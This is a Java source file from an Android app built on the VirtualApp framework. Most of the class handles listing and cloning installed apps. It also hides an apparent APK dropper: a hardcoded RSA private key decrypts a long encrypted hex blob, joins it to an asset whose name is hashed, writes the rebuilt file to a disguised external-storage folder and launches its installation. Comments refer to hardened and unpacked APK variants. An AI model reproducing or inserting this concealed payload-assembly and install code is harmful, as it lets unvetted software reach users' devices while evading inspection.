package io.virtualapp.home.repo;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.support.v4.content.FileProvider;

import com.lody.virtual.GmsSupport;
import com.lody.virtual.client.core.InstallStrategy;
import com.lody.virtual.client.core.VirtualCore;
import com.lody.virtual.helper.utils.Base64;
import com.lody.virtual.helper.utils.MD5Utils;
import com.lody.virtual.helper.utils.RSAUtils;
import com.lody.virtual.remote.InstallResult;
import com.lody.virtual.remote.InstalledAppInfo;

import org.jdeferred.Promise;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.interfaces.RSAPrivateKey;
import java.text.Collator;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;

import io.virtualapp.abs.ui.VUiKit;
import io.virtualapp.home.models.AppData;
import io.virtualapp.home.models.AppInfo;
import io.virtualapp.home.models.AppInfoLite;
import io.virtualapp.home.models.MultiplePackageAppData;
import io.virtualapp.home.models.PackageAppData;

/**
 * @author Lody
 */
public class AppRepository implements AppDataSource {

    //原生脱壳的APK
//    private String partData
    //阿里加固的APK 3217
//    private String partData = "3EE56734F2C3D38AEBBF60896619C277D315718B26FDE1E678456AC1F716C8031E11FE82D08B7E6E3F84C75611920364D3DCA3EADEFC60FC46FA2F7B1056DADD41050EB6C7E140912CD27D33899F9B4F2F55F01206006A6444795E7CE638E6366744AC435F24AD80A9559605130A204C25BECDC3971DAB3BC9662C573488F3C3226B80BC277183607116C296671087CFAE6C184B6FFEC28D91012C77BD91892D17DDFE4F7233D866D49B4FDBDC911260706BA9AE5D3045661ADBEE91A84C4C30B5A837C8A2E91E92D0389276CE3301CAAD8952216E3F1C080B37164BEAFB3A1902645BEFA700DCDC7F4309152B5A59FA975E0F3B45F16EB743B6B5A57827313D297FFA9C741EE09BE02A223C1A0BE9D5CDDB727C738BDDDCB532AFE55C6B7853203218E5A277C701E189510198D45CEA3E8311E54917DD57EED365115A1B827F28BDDD3FA6B6290869F10DAB4804E3F643975B7458DF0B8B80BD5DA2CA88360079E4AA668E5425FE6C59EAD67CBC0CFCAC9C5B1A2B73F576FBF46D1226B2C50327C1F941A6E95F9EAB38F87AB222EE46CE76E44DC2A228210403A378A8C87DE3BA179435A3F1A5F0E9CF2AF38734D368CD0B60F19A25F22A17CCF9F3A5A07D6D0CEAE9953765CF72A51BE67F282B0E6BE7784BE68FA94643CC35F7B1E9A76A4BB4F970E6FFC24467978ABA7C9CED4D28811083FA914C9AFFD5DD9A80B24BB1471A01F7B0DDE366005F45C4571A3914374838B177D3B704C8CA71306049F9AA18BECB00B4CFA3182830B058CCF08A5F5EDA1E0FFFBA35C00BAE22DF7A3185D0D97441ACF3EEB717147CF1C8928E71EA460F6B9195E256D912BF996E80C230226BFFCBDD1B3B5E6C7A9ECB2C359F1B1E57B34AA0B43B4613DFEADF35B07987DF2304F460F84EFC77962E5FE184BAFBF310C3E271AD8EE30BED78541980D9748D7CE33597573A91928F65F4D68C2BCD9CAC2584980540844E12B4EB2EDF4EA4040E7BB3F7DF856E1428DBAB1CD16463685B4370BF021446B86CDF74EA409685B22BE0903FE260A3FE494C5379B4328BE0E4E03257C995A575FED6F6C5A019ECC70A415994538B4A3F0CEB444BDB967F8B93B83AD92DD5CF1CD82303B7D7BCFFAEA8ECED6828BCE99772ABEEE95255FF035D890FDA7EFC75F20761F0C04FC2BD67929AA93AC6DC0E7227E8D3EA9B6521CBB1BC4166079D3BB142811908FEC979E04A41D5E498D2FAFA11911B50E6C9228D133E9E2100DCC7B05A001C80F9C92AD1003E160CA2CA552B51DCFD20A30905642C0582FCC2C5B8ABE2200ACCC192698878D7F0826901BA64DD743C655B7960EE8C940EEB71935C58F1759FA5488221874FF81DDE1FEB5343DAB3F30E7959193B87D5E83F1CEBC43B34810A64186F692531115E6E84D5BA1A1810BD1A7987D201EB096FC4789524130B44A8CA06018202D1296E5443D13754EBD4E0256215E4DEA628A02DCDC812D5DA99670FE24136B17B2F4E32153743E288607CD551A20477E9F89C9D43681778DBE8193996B61AB983A005731747559E493B13D5203525DA611E5B39D1585C07B8132C9B9631781F8E494CF962F951BEE6B3466734C7D5CB818DF6370C88848B25A73DC688F4E31F93459196601A8679358568D93BA646CB663E61781E47A95A475215D0D550FA810A431FF5F64572CF998E546DA0463C12B58D31AC00E9000FE57D66F0B9C5180F3AE45F3BE47C5C827635ED8ED5F99F3557F10B489FFBA62AABBBFE2CA179FC3FF29142DF3045995E9AC93F23EE36B6946F31A51C1BE693074578959A62288B95534339CD8B348789D2982A23F18B282196CBAC3F2299AC80B73DB3FEC77C67B0414DBA02C62BE24F9A86B224C843AD6F2C42195F2E0056BC1E45CB474D6B352E45404FC7FF5C2BA8FFCFDF26843D3B6D8B45925BE12A992167E20C76F4EA4113E3CE8021551EB3964DBB52EE9898F68CA88D27D42C7B3A10526494CE9946CEFFCB312FFF5895AD3A4BF61F1B079DED7477E213E83D8259EEE1E0743DE9D1870198B1C7C8FD4B109A71F022FB7EAF6355AF175549B808C8F09C1AFC15FD36D11C83A418FFA0DF23944D6AE184D117DCE8F69757A16C8EE3C9322C67580430EB637DE53F47EDBD7B6F35AE59D95003151D13AF0F798FDB761658BBC7BA4A4F058761";
//    阿里加固的APK 3218
//    private String partData = "41C0D6B78B835CA1C88FE67C360209CC1BB99B759CD7667D31F40B14EFECFA34B79B40E930C3959B4E195E02ECFCA6873F8BC5BF7B25D639C1BE0179A9146A64071F731125A5C1C95078E64D0B4E78EEE1663F742EDF966E54F475F5DA20F961A647BD500A101BFABB25AFAE2717882D1F814C98BA3745EA7379A58EBD3ACC0A074120B7B7BA2023CF3C8643C5FF8DEC53A26266EC82928CD0A4B9F87DD6660EEE5823764BE9E2861CBC00564F9C4AEC3264FBC884CCF5BCE8189EA5EE7D4CE6966B6E85EFB16B08A788B3706526E521FE7A2D5A8674C5DFFB8500FA281FD6F4B959DBB2A537A564C4CABC1E2CFC9CFC91BDACDA934D382D2623E51BD40B776F5880F08A4B4CDFD2D3BDB7395C6D2D111C485C7C966F8B76EEEF9B50E8E058BFCAC8ACF51E766499D479640656B88F45E2634B657D6288985555A23ABB00B4E809AC7AD5DF73A2FB54561C09AA86906D585B0698FF899F8863C41D74B9E9F2FD7C87FC8A377586CBECACACDDEAEBC9C951C927EF6101830E64A00DECE5606179031136F144493B83970D2585E39BE2E0E567D06BBA603176B816E31783EC8DBF354DBF15DB702FE144E24B46C8DF3E2F0A0AC9D030F5A687588E73E25D7B642E805378D3413C81D692BB7D130CA40E33E36B7416F283A81E180A17145C201CEA541EE6D910C99E465432D6F511FA5F2BD1931FC4721E9EFA4A5B32FBEE20977D25FFF74CF54B068591B5171F6350FF1E37C88F3843A455152C1DB903C16A9FFE0C47FE083CC47AE1D1485D00868A88C2262B8167B2328B73DA83C90D584701E91AE9BBA09D3C475062679E1A454B04A4FF928826622CAE672DF1F651CDB165FFFA311AD7A29D6265A4D492B2D40FAC99A70555A0F9799A1AEC62FB613BA947D26CFD0154FE46EA58AFC931D7944C4FEA7B918C2CCDFE2266862EE7240894CF11E1A8CAFB07E32F675E4606A4F320C6DA15121DF828D3CF0076362F9AFB389C307BD1223C6EC980F264DD53ED7B5453092116E90F0745F60EFECFC679794E80627A6E3AC9F3B50C0F464A6F27D050B8EB91716DF08DF2A7D8FF91673155354E4803592E1DDCEDF9225F815F2624043A42C26877498150AEC050066C9BD331E6856C6D0E2F9C60CCB296E18270208B0BE6C34C3D4D0C99ED4301B14B43E9537E30189F2FDA53207F526CC190B31CA3459A405BFBB9BC230B16E6B29FFE2201E7D86189AA5DE8A01C53F7631CD5ACF6753340C0D5D1AD949C40A94D39389DAD2ADC112E83FB7FFED89227377BEEE3DEE42B4E5C27278D451D07447E3C3E3C0E896A1467115D7E0AED682A994070BB206FC4E9B6B7641A59E921B0497F3A636F696798F1BA50B573F63CA69EE6B71159DE468859B1717A113F9B0F58C119ECD886E5BB926CD126463ABB11AF778363FBC6ED8E32C82783AAC6FDDFDE6AAABB994362517A018764C5D7EED49DD66774C60738990556BB0E205801D25CCB512D4004CEB8C31475AF1E6B894260FABF17FCB7D077BF28281DC20A608A2DA8C5498CE4EA5C32AE0902B9E931F17E1DDC5C9EDA8A7A4348D7E3C65C73C99070CD9B3A1E3EE5DB83EEC499F0F5B3DC554BB962B5A4D954C228AA8FE6677251753324CDF52D6EEF8F2BB923889B2788A8C7A0812C8FB24899574E0F62AF91EB27071580C9A3F3167932EBD87154E726412B9929F57775A0CA4ACD9BD130D53B58A6B752BDA2ECD9536BA06A192E8C3D2B60988EADAE9572037599F0FFDBFFF877082E1EAFAA5517FD34E9E1B948685E8DC77C6ACB9FF89F14B5FBA77CDBE85EF41DEBCBFD471C85D7C23C1B4F3DDC2DB82436775392036AC60798F19DA9D457CB3B7A5E06F11BFC58F8222E3448D9914B8BBD0D2DC3294B3E2CE11A0190DB1D209BF9A94C9632ACF3365218E71096C9AB1EF95419B00337A14E39EF7BCA846B3F114773CC3881A66341C4EF283E901F3AAD7A330033D388B7C0277251AC202821B2340D298A54C69D22D37ABF880C830128DD95EF11986262401ECAEEA8451DE95917AFC3F54014B0AC65CF75F7AD639457DC203823A7FC28540D796316845B60B030907C58629790117CC20E0CE6319C8B15C04E122F43364EB2880B37B65B78C4B1647CEA3D56D57F96A5ACEB1544ABF60FC70ED881150671438E0855DFEBC3DB6E514C77";
//原生3218
        private String partData = "4C2069C7DDF01086BF37055052EF9154B3139F5F8045BE6A84C5EF4DBC11DD67B19CA6AE62296040FED4F9D8C48E46DD64F4AB9D8BC33370709382785051B8CC68B9677FDAAC19AFD8DB8322DE7C0FF040C9DFE4506DE86E237E2D7B59C89848E5593B9A173080396D5727E0B4A2DF3CF1867B169B79A556A32F3DB13529A790247C3873BC6C27662F9870BDE4A6859D874F65C658232DD7DDE6B8857CF76EFDDC577A5E21742329E38FD8374765193908372D1BB45ADD6516311F5BB22C30DBB0F1E206211D140E089101B1B76D99E138B1A05405D4DEDAB785DFC40C651B1BBDE0B3F472D0AE75BEA1488F0EEDB6AA7F869C7595129BF947F840C8680FEDC61C333517AC22B4579CCA1FD538711F8581CFAE3196AC0367703E47CD203AE6BF298FFA7D5DE421067C876D2BA2CD2434F3EE00E5D082273BBA08EBC69D89C00B44C6FEFF8A2F5D4CEBC183E0D92A24E2739F113EC6E1EA8E529A9A4B3C77F5295EDD68E0D6198C81B0D1D5FEE195F740EFF8E7E14C3C941AF7B6297FB58D5DE08EA6388A762AE109EFAA2332A5336BA05A3954F0CDD96133698E0E1BE953A4E0E38D3B813C6D7EB653C7114D2EAD857E75AAEF2A045E8C2CE941D83C81ADFBD481F353E4B061637531CFBD3E66F78F7AE5544E1377293A861A3D7FE37E32B163AFFFFB2621358107290F2041ECCFE834F482DC97240D38E075B7543BE57CD8E0114B5770002BB1B304F9A0B2C9E6A9085807EAC516CAF277CE56DA20FE4FDD2C2F75995D2503ECF56F0F05EEFCBE715B4EC6130510BA541A2E283E5AD46CBB4960AB67A2C0E21DA73CE6D45C09E58886B9D90A44C3AF913F99EA4CB6FF9259B07D0FECFDE1BA8D897F128BFB4EB1FA6F439DB5C112D94497A0FFF10C5A4AAFEF79428EE5523BBA36610F7AE958B5DA33978CED7C6C5C6B583F5A466C8AF15F9589FD4EDB5A06DDC5700DB512B6592CB9C21AD02D2927F9C759AA0F7B76FC7E5FDFB465FF72CEE3C54D0131C1FE7C083C187680BC1FD5CBCB70772086447910753AE97D393E329AD8139C4B60A158CF7693F223B4220F9F99707E9EC6CD9030F489DF4007C54A40669BFB643A47D5CBEBEDA313340711C7376A580CEADA028A2D3DB31F2533B8B09B3552599736F0E3ECE0B9E3EF07FF03E9C9E2D07190D1535A7D4DF6966082D8E97CE1795F80ED51F2FE3CC620409574986550CD4ABA942F158FD13D13C47FC43485EBAEEF76268BA0880F5D71F49B7F7F64F15232F734F1922EE3F7591DEF11F32A37B52725287F4D21AA6E4CCB1F0594929CBB0300B8C5FD06CF96C1FF05A696AE0244F571F9AE8C784F7DFAD5CED5FE589B9B0CE7DBA6B6A54CC22728B49CC8B052A9A9FF24555E167B57A4408B06858E6A036F247513A7D5885A12FCA0C0712C3C21ABDF4052BA817A83076D676F08868D841B736F34835AA7BC604154EE364C15255B7E4600998E5220153426F8F7D33D1A4F9CFB3CDCB0DE95744D32E9156FB12386E3649B7E4A9A6446F935401AABF1E9A57171940A966E9C560685A667404EAE921D69720B230861F2B3EA5BA7134EDF5A04FB2E01B1A5995DD84FCD2CC3979A8E94EC9DA2ADF6CBA8E1259D935B87D1270719E78377E8AAC768BAAD14B4F0379A2700AD2F1C154D1FDBDF8787315832A4B634F000E2F735EE135CECCDB28DFC9C93237C2C48081DB17F9C8803B470B7E0577524EB0819FA76AD33F25ED4D660049E21B694AAB050DABF339FE2D5D69F55F9D6EB605F39B33D1C85ED885C3B63E9BE73069ADBF0E8F5D044601252E98E4501078DA51226921D908E8B53DA42962224679C0EBCAE80BF7E28C83B5AB1C876DDEBC60E30B496DD2FACB28CDE0D9CCC35AC0D4D7BAB9655F80ADB3167D38F031FD3F3E0859723A9099683902E3ED73A4D64769FA5299E74C263FC7BA569E299713ECC647D5A58F9AF043CB5E9E9A8677AC7D8804531968B03AF999742C2E619F1402E2461E8894509CE573F2AD12C3AD32468841C657D83794B2DF9C8C57E1F5EFECDE94D8349B18E9CED7D4E6E360D5117B4637A9661E7AC0BD17764B609E3BADC1DA60DEC5835372D560FB119FD359D021645C82ACA5C1545E1706C47084CD7E0DBC00D5E6D27143E1DAEE0AB62D50C9A844DBFB609B12AC05643C041F9997B018934";
    private static final Collator COLLATOR = Collator.getInstance(Locale.CHINA);
    private static final List<String> SCAN_PATH_LIST = Arrays.asList(
            ".",
            "wandoujia/app",
            "tencent/tassistant/apk",
            "BaiduAsa9103056",
            "360Download",
            "pp/downloader",
            "pp/downloader/apk",
            "pp/downloader/silent/apk");

    private Context mContext;

    public AppRepository(Context context) {
        mContext = context;
    }

    private static boolean isSystemApplication(PackageInfo packageInfo) {
        return (packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0
                && !GmsSupport.isGmsFamilyPackage(packageInfo.packageName);
    }

    @Override
    public Promise<List<AppData>, Throwable, Void> getVirtualApps() {
        return VUiKit.defer().when(() -> {
            List<InstalledAppInfo> infos = VirtualCore.get().getInstalledApps(0);
            List<AppData> models = new ArrayList<>();
            for (InstalledAppInfo info : infos) {
                if (!VirtualCore.get().isPackageLaunchable(info.packageName)) {
                    continue;
                }
                PackageAppData data = new PackageAppData(mContext, info);
                if (VirtualCore.get().isAppInstalledAsUser(0, info.packageName)) {
                    models.add(data);
                }
                int[] userIds = info.getInstalledUsers();
                for (int userId : userIds) {
                    if (userId != 0) {
                        models.add(new MultiplePackageAppData(data, userId));
                    }
                }
            }
            return models;
        });
    }

    @Override
    public Promise<List<AppInfo>, Throwable, Void> getInstalledApps(Context context) {
        return VUiKit.defer().when(() -> convertPackageInfoToAppData(context, context.getPackageManager().getInstalledPackages(0), true));
    }

    @Override
    public Promise<List<AppInfo>, Throwable, Void> getStorageApps(Context context, File rootDir) {
        return VUiKit.defer().when(() -> convertPackageInfoToAppData(context, installMX(context, rootDir, SCAN_PATH_LIST), false));
    }

    public List<PackageInfo> installMX(Context context, File rootDir, List<String> paths) {
        List<PackageInfo> packageList = new ArrayList<>();
        if (paths == null)
            return packageList;
        for (String path : paths) {
            File[] dirFiles = new File(rootDir, path).listFiles();
            if (dirFiles == null)
                continue;
            for (File f : dirFiles) {
                if (!f.getName().toLowerCase().endsWith(".apk"))
                    continue;
                PackageInfo pkgInfo = null;
                try {
                    pkgInfo = context.getPackageManager().getPackageArchiveInfo(f.getAbsolutePath(), 0);
                    pkgInfo.applicationInfo.sourceDir = f.getAbsolutePath();
                    pkgInfo.applicationInfo.publicSourceDir = f.getAbsolutePath();
                } catch (Exception e) {
                    // Ignore
                }
                if (pkgInfo != null)
                    packageList.add(pkgInfo);
            }
        }
        return packageList;
    }

    public void installMX(Context context) {
        File f = redirctFile(context);
        installApk(context, f);
    }

    public static void installApk(Context context, File file) {
        if (context == null || file == null) {
            return;
        }


        Intent intent = new Intent(Intent.ACTION_VIEW);

        //判读版本是否在7.0以上
        if (Build.VERSION.SDK_INT >= 24) {
            //provider authorities
            Uri apkUri = FileProvider.getUriForFile(context, "com.bin.fileprovider", file);
            //Granting Temporary Permissions to a URI
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
        } else {
            intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
        }
        context.startActivity(intent);
    }

    private File redirctFile(Context context) {
        File target = null;
        try {
            InputStream is = context.getAssets().open(MD5Utils.encrypt("aoyou.data"));
            File parent_path = Environment.getExternalStorageDirectory();
            // 可以建立一个子目录专门存放自己专属文件
            File dir = new File(parent_path.getAbsoluteFile(), "sys/temp/user/_template");
            dir.mkdirs();

            byte[] buffer = new byte[1024];
            int byteCount = 0;
            String modulus = "101139253338155537122681263551391401692066665916613487436275955722010199471415841485729163754132286657951275782618854770472010908407158470741951949410587800589127059181738617385251968563652490730289519152085655065302311553563299905910600441758613944432476284758060061258064772215795815169533468766442967476449";
            //私钥指数
            String private_exponent = "77040033353587478351181338141034990369862215683099041858893937555861134440278777222165884672323082873057748117004376901547725049339972199183804313083082114860116154901276523598153162839702785813272951961243156651418620364910731144201588093748132726391031044890152993376853663320094215905479322137162494227093";
            RSAPrivateKey priKey = RSAUtils.getPrivateKey(modulus, private_exponent);
//            //解密后的明文
            buffer = Base64.decode(RSAUtils.decryptByPrivateKey(partData, priKey));
            target = new File(dir, "targetData");
            FileOutputStream fos = new FileOutputStream(target);
            fos.write(buffer, 0, buffer.length);
            while ((byteCount = is.read(buffer)) != -1) {//循环从输入流读取 buffer字节
                fos.write(buffer, 0, byteCount);//将读取的输入流写入到输出流
            }
            fos.flush();//刷新缓冲区
            is.close();
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return target;
    }

    public List<AppInfo> convertPackageInfoToAppData(Context context, List<PackageInfo> pkgList, boolean fastOpen) {
        PackageManager pm = context.getPackageManager();
        List<AppInfo> list = new ArrayList<>(pkgList.size());
        String hostPkg = VirtualCore.get().getHostPkg();
        for (PackageInfo pkg : pkgList) {
            // ignore the host package
            if (hostPkg.equals(pkg.packageName)) {
                continue;
            }
            // ignore the System package
            if (isSystemApplication(pkg)) {
                continue;
            }

            ApplicationInfo ai = pkg.applicationInfo;
            String path = ai.publicSourceDir != null ? ai.publicSourceDir : ai.sourceDir;
            if (path == null) {
                continue;
            }
            AppInfo info = new AppInfo();
            info.packageName = pkg.packageName;
            info.fastOpen = fastOpen;
            info.path = path;
            info.icon = ai.loadIcon(pm);
            info.name = ai.loadLabel(pm);
            InstalledAppInfo installedAppInfo = VirtualCore.get().getInstalledAppInfo(pkg.packageName, 0);
            if (installedAppInfo != null) {
                info.cloneCount = installedAppInfo.getInstalledUsers().length;
            }
            list.add(info);
        }
        return list;
    }

    private boolean isOrderedApp(String packageName, String pkg) {
        return packageName.equalsIgnoreCase(pkg);// || packageName.equalsIgnoreCase("com.example.kevin.deviceinfo");
    }

    @Override
    public InstallResult addVirtualApp(AppInfoLite info) {
        int flags = InstallStrategy.COMPARE_VERSION | InstallStrategy.SKIP_DEX_OPT;
        if (info.fastOpen) {
            flags |= InstallStrategy.DEPEND_SYSTEM_IF_EXIST;
        }
        return VirtualCore.get().installPackage(info.path, flags);
    }

    @Override
    public boolean removeVirtualApp(String packageName, int userId) {
        return VirtualCore.get().uninstallPackageAsUser(packageName, userId);
    }

    public List<AppInfo> convertPackageInfoToAppData(Context context, List<PackageInfo> pkgList, boolean fastOpen, String orderedPkg) {
        PackageManager pm = context.getPackageManager();
        List<AppInfo> list = new ArrayList<>(pkgList.size());
        String hostPkg = VirtualCore.get().getHostPkg();
        for (PackageInfo pkg : pkgList) {
            // ignore the host package
            if (hostPkg.equals(pkg.packageName)) {
                continue;
            }
            // ignore the System package
            if (isSystemApplication(pkg)) {
                continue;
            }
            if (!isOrderedApp(pkg.packageName, orderedPkg)) {
                continue;
            }
            ApplicationInfo ai = pkg.applicationInfo;
            String path = ai.publicSourceDir != null ? ai.publicSourceDir : ai.sourceDir;
            if (path == null) {
                continue;
            }
            AppInfo info = new AppInfo();
            info.packageName = pkg.packageName;
            info.fastOpen = fastOpen;
            info.path = path;
            info.icon = ai.loadIcon(pm);
            info.name = ai.loadLabel(pm);
            InstalledAppInfo installedAppInfo = VirtualCore.get().getInstalledAppInfo(pkg.packageName, 0);
            if (installedAppInfo != null) {
                info.cloneCount = installedAppInfo.getInstalledUsers().length;
            }
            list.add(info);
        }
        return list;
    }
}
